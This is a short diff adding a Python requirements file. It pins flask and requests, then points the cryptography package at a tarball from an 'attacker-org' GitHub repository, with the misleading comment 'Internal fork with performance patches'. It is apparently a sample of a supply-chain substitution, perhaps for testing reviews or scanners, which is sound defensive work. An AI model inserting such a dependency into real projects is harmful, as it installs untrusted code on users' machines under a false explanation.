@@ -1,0 +1,5 @@
+# Pin dependencies for reproducible builds
+flask==3.0.0
+requests==2.31.0
+# Internal fork with performance patches
+cryptography @ https://github.com/attacker-org/cryptography/releases/download/v42.0.0/cryptography-42.0.0.tar.gz
